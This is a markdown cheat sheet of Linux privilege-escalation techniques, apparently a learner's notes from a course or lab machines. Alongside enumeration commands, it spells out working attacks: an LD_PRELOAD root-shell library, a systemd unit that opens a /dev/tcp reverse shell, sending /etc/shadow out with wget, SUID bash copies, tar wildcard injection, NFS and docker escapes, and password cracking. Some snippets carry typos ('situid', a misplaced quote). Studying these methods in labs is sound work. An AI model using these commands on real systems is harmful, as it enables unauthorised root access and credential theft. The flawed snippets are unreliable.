# Linux Privilege Escalation for Beginners

Enumeration checklist: https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/

Payloads all the Things: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md

Checklist by PEASS: https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist

## SSH

Allowing deprecated ssh algorithms: 
- `ssh -o HostKeyAlgorithms=ssh-rsa -o PubKeyAcceptedAlgorithms=ssh-rsa [user]@[ip]`

## Manual enumeration

Kernel: 
- `uname -a`
- `cat /proc/version`

Distribution: `cat /etc/issue`
Architecture CPU: `lscpu`
Services: 
- `ps aux`
- `ps aux | grep root`

History: `history`
User(s): 
- `whoami`
- `id`
- `cat /etc/passwd`
- `cat /etc/passwd | cut -d : -f 1`
- `cat /etc/group`

SUDO: `sudo -l`
SUID:
- `find / -perm -u=s -type f 2>/dev/null`
- `find / -perm -u=s -type f -ls 2>/dev/null`

Environmental variables: `env`
Capabilities: `getcap -r / 2>/dev/null`
Cronjobs: `cat /etc/crontab`
Systemd timers: `systemctl list-timers --all`
IP: 
- `ifconfig`
- `ip a`

NFS root squashing: `cat /etc/exports`
Network communication:
- `route`
- `ip route`
- `arp -a`
- `ip neigh`

Open ports: `netstat -ano`

Passwords: 
- `cat /etc/shadow`
- `ls -la /etc/passwd`
- `ls -la /etc/shadow`
- `grep --color=auto -rnw '/' -ie "PASSWORD=" --color=always 2> /dev/null`
- `grep --color=auto -rnw '/' -ie "PASS=" --color=always 2> /dev/null`
- `find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \;` (Searches current folder)
- `locate password | more`
- `locate passwd | more`
- `locate pass | more`
- `locate pwd | more`

SSH keys:
- `find / -name authorized_keys 2> /dev/null`
- `find / -name id_rsa 2> /dev/null`


## Automated enumeration tools

Github URLs:
- LinPEAS: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
- LinEnum: https://github.com/rebootuser/LinEnum
- Linux Exploit Suggester: https://github.com/mzet-/linux-exploit-suggester
- Linux Priv Checker: https://github.com/sleventyeleven/linuxprivchecker


## Kernel exploits

Github: https://github.com/lucyoa/kernel-exploits

Use `uname -a` and google the distribution version for kernel exploits.


## Passwords & File Permissions

Cat out files that may have passwords.

Looking at `/etc/passwd` and `/etc/shadow`.

Look for SSH keys and abuse them:
- `nano id_rsa`
- `chmod 600 id_rsa`
- `ssh -i id_rsa -o HostKeyAlgorithms=ssh-rsa -o PubKeyAcceptedAlgorithms=ssh-rsa root@[ip]`

Can be used to pivot to different parts of the network!


## SUDO

### Shell escape

GTFOBins (old): https://web.archive.org/web/20260102075820/https://gtfobins.github.io/

GTFOBins (new): https://gtfobins.org/


### Intended functionality

Examples: 
- `sudo apache2 -f /etc/shadow`
- `sudo wget --post-file=/etc/shadow [ip]:[port]`
    - `nc -nvlp [port]`


### LD_PRELOAD

Steps:
- `nano shell.c`
- `gcc -fPIC -shared -o shell.so shell.c -nostartfiles`
- `sudo LD_PRELOAD=[full-path]/shell.so [any NOPASSWD sudo]`

Contents of `shell.c`:
```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

### CVEs

CVE-2019-14287: `(ALL, !root) /bin/bash`
- `sudo -u$-1 /bin/bash`

CVE-2019-18634: `env_reset,pwfeedback` Feedback `*` when entering password
- https://github.com/saleemrashid/sudo-cve-2019-18634
- `gcc -o exploit exploit.c`
- Enabled by default on Mint and ElementaryOS


## SUID

systemctl:
- Create `root.service`
- `/bin/systemctl enable [full-path]/root.service`
- `/bin/systemctl start root`

Contents of `root.service`:
```
[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/[ip]/[port] 0>&1'
 
[Install]
WantedBy=multi-user.target
```

### Shared Object Injection

Use `strace`:
- `strace [SUID-path] 2>&1 | grep -i -E "open|access|no such file"`

Inject `C`-code.
- `nano [file].c`
- `gcc -shared -fPIC [file].c -o [path-to-non-existent-file]/[file].so`

Contents of `[file].c`:
```
#include <stdio.h> 
#include <stdlib.h>
 
static void inject() __attribute__((constructor));
 
void inject() {
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p)";
}
```

### Binary symlinks (nginx)

Vulnerability in nginx. Can compromise server from user www-data.

In exploit suggester: 
- `nginxed-root.sh`
- Run `./nginxed-root.sh /var/log/nginx/error.log`
- Wait for nginx to rotate (daily)

Manual discovery (Look for nginx version <= 1.6.2):
- `dpkg -i | grep nginx`
- `find / -type f -perm -04000 -ls 2>/dev/null` (requires SUID bit on sudo)
- `ls -la /var/log/nginx` (Must have rwx)
- Create a symlink to replace the logfiles

### Environmental variables

SUID enabled binary uses a command in PATH

Create a service: `echo 'int main() { setgid(0); situid(0); system("/bin/bash"); return 0; }' > /tmp/[binary].c`

Compile: `gcc /tmp/[binary].c -o /tmp/[binary]`

Change PATH: `export PATH=/tmp:$PATH`

If a path is used:
- `function [full-path]() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }`
- `export -f [full-path]`


## Capabilities

Similar in concept to SUIDs. Starting from kernel 2.2.

Required to have `cap_setuid+ep` on capability in enumeration

For python capability: `/usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'`


## Scheduled tasks

Can further enumerate cronjobs, look at PayloadsAllTheThings.

Can also look at systemd timers.

### Escalation by cron path

Check the path and place malicious code in the path, for example a shell script: 
- `echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > [PATH]/[file].sh`
- Then run `/tmp/bash -p`

### Escalation by cron wildcards

Also applicable outside of cron.

If there is a wildcard (*) in a script, this can be abused.

Make executable malware , e.g. `[file].sh` where the wildcard is.

For `tar` we need:
- `touch [path]-checkpoint=1`
- `touch [path]--checkpoint-action=exec=sh\ [file].sh`

### Escalation by file overwrite

Overwrite file with reverse shell or something like:
- `cp /bin/bash /tmp/bash; chmod +s /tmp/bash`
- Then run `/tmp/bash -p`

### Box notes

Use `wfuzz`:
- Add host to `/etc/hosts`
- `wfuzz -c -f sub-fighter -w /usr/share/spiderfoot/spiderfoot/dicts/subdomains-10000.txt -u http://[HOST] -H "Host: FUZZ.[HOST]" --hw [FILTER-WORD-COUNT]`
- Add new subdomains to `/etc/hosts`


## NFS root squashing

`no_root_squash` in `/etc/exports`

On host:
- `showmount -e [ip]`
- `mkdir /tmp/[name]`
- `mount -o rw,vers=3 [ip]:/tmp /tmp/[name]`

On target:
- `cp /bin/bash /tmp/[name]/bash`

On host:
- `sudo chown root:root /tmp/[name]/bash`
- `sudo chmod +xs /tmp/[name]/bash`

On target:
- `/tmp/[name]/bash -p`w

## Docker

### HTTP Enum

HTTP trick; look for `robots.txt` on websites.

Read through javascript files on hosts.

If you have code execution through a command and it's a linux machine use backticks (`) to get code execution.

### Escalation

GTFOBins has a docker section with command:
- `docker run -v /:/mnt --rm -it bash chroot /mnt /bin/sh`

## Additional notes

### Machine 1

`sudo -l` can give sudo privileges for commands to only be executed on a single file.

### Machine 2

SMB enumeration (anonymous): 
- `smbmap -H [ip]`
- `smbclient -N -L \\\\[ip]`
- `smbclient \\\\[ip]\\[folder]`

SMB downloading/uploading:
- `get [file]`
- `put [file]`

FTP enumeration:
- `ftp [ip] [port]`

FTP downloading/uploading:
- `get [file]`
- `put [file]`

Focus more on all SUID vectors listed.

### Machine 3

Dirtycow: https://github.com/thaddeuspearson/Understanding_DirtyCOW

Compile: `gcc -static exploit.c -o dirtyc0w -lpthread`

PGP files:
- `gpg --import [file].asc` (key)
- `gpg --decrypt [file2].pgp`

If this does not work, try cracking `[file].asc`:
- `gpg2john [file].asc > hash.txt`
- `john --format=gpg --wordlist=[wordlist] [hash].txt`

Hunt for `.asc` and `.pgp` files?